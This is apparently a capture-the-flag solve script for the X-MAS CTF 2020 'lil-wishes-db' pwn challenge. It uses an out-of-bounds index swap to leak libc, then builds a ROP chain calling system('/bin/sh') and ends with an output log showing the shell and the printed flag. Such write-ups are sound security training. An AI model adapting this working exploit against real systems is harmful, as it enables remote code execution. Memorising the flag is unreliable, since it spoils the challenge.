from pwn import *

adjust_leak     = 0xe7  
ret_addr_offset = 4294901771    # 0xffff000b will make the "0x0b" at the end of the number to be used as index specifier(multiplied by 8):    
                                # 0x555555554864    lea    rdx, [rax*8]

libc = ELF('./libc.so.6')
rop  = ROP(libc)
p    = remote('challs.xmas.htsp.ro', 2002)


# leaking a libc pointer
p.sendlineafter('Option:', b'1')  # choosing "1.Swap IDs"
p.sendlineafter('Index 1:', b'0') # swapping between ID[0] with ret_addr_offset
p.sendlineafter('Index 2:', str(ret_addr_offset).encode()) # ID[0x0b] 

# fetching the leak
p.sendlineafter('Option: \n', b'2') # choosing "2.Print database"
p.recvline()  # empty line
id0 = p.recvline() # leaking <__libc_start_main+240>
libc_start_main_240 = id0[:-1].decode().split(' = ')[1]

libc_start_main = (int(libc_start_main_240) - adjust_leak) # getting <__libc_start_main+0>
libc_base       = libc_start_main - libc.symbols['__libc_start_main']

print('libc base :: ', hex(libc_base))


system_addr = libc_base + libc.symbols['system']
bin_sh_str  = libc_base + list(libc.search(b'/bin/sh'))[0]
pop_rdi     = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
libc_adjust = libc_base + rop.find_gadget(['ret'])[0]

# pop rdi
p.sendlineafter('Option: \n', b'3')
p.sendlineafter('Index:', b'2') 
p.sendlineafter('Value:', str(pop_rdi).encode())


p.sendlineafter('Option:', b'1') 
p.sendlineafter('Index 1:', b'2') 
p.sendlineafter('Index 2:', str(ret_addr_offset).encode()) 


# bin sh str
p.sendlineafter('Option: \n', b'3')
p.sendlineafter('Index:', b'1') 
p.sendlineafter('Value:', str(bin_sh_str).encode())


p.sendlineafter('Option:', b'1') 
p.sendlineafter('Index 1:', b'1') 
p.sendlineafter('Index 2:', str(ret_addr_offset+1).encode())



# extra ret gadget for stack alignment
p.sendlineafter('Option: \n', b'3') 
p.sendlineafter('Index:', b'4') 
p.sendlineafter('Value:', str(libc_adjust).encode())


p.sendlineafter('Option:', b'1') 
p.sendlineafter('Index 1:', b'4') 
p.sendlineafter('Index 2:', str(ret_addr_offset+2).encode()) 



# system addr
p.sendlineafter('Option: \n', b'3')
p.sendlineafter('Index:', b'1') 
p.sendlineafter('Value:', str(system_addr).encode())


p.sendlineafter('Option:', b'1')
p.sendlineafter('Index 1:', b'1') 
p.sendlineafter('Index 2:', str(ret_addr_offset+3).encode())

# pop a shell
p.sendlineafter('Option: ', b'4') # choose "4. Exit" to trigger the ROP chain
p.interactive()


# output:

# $ python3 solve.py
# [*] '/root/host-share/xmas-ctf-2020/pwn/lil-wishes-db/lil_wishes_db/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Loaded 198 cached gadgets for './libc.so.6'
# [+] Opening connection to challs.xmas.htsp.ro on port 2002: Done
# libc base ::  0x7f7cf8830000
# [*] Switching to interactive mode



# Merry Christmas!
# $ id
# uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
# $ cat /home/ctf/flag.txt
# X-MAS{oh_nooo_y0u_ru1ned_the_xmas}